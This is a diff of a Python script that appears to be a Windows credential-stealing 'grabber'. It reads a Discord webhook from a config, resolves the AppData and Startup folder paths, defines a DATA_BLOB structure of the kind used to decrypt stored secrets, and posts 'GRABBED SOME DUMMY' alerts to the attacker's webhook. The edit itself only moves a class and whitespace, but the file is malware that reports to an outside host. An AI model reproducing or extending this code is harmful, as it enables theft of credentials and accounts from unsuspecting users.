@@ -45,13 +45,13 @@ def writeforfile(data, name):
             if line[0] != "":
                 f.write(f"{line}\n")
 
+                
 webhook = cc.get_webhook()
 debug_mode = cc.get_debug_mode()
 wh_avatar = cc.get_avatar()
 wh_name = cc.get_name()
 eb_color = cc.get_color()
 eb_footer = cc.get_footer()
-
 
 local = os.getenv("LOCALAPPDATA")
 roaming = os.getenv("APPDATA")
@@ -60,9 +60,6 @@ startup_loc = roaming + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"
 Threadlist = []
 DETECTED = False
 
-class DATA_BLOB(Structure):
-    _fields_ = [("cbData", wintypes.DWORD), ("pbData", POINTER(c_char))]
-  
 
 payload1 = {"content": "<:pikachusign:1084901293669220422> **AYOOO GRABBED SOME DUMMY** ||@everyone||", "username": wh_name, "avatar_url": wh_avatar}
 payload2 = {"content": "https://cdn.discordapp.com/emojis/1084901411768238190.gif", "username": wh_name, "avatar_url": wh_avatar}
@@ -70,6 +67,11 @@ payload3 = {"content": "https://cdn.discordapp.com/emojis/1084901431531798641.gi
 response = requests.post(webhook, json=payload1)
 response = requests.post(webhook, json=payload2)
 response = requests.post(webhook, json=payload3)
+
+
+class DATA_BLOB(Structure):
+    _fields_ = [("cbData", wintypes.DWORD), ("pbData", POINTER(c_char))]
+
 
 def GetData(blob_out):
     cbData = int(blob_out.cbData)
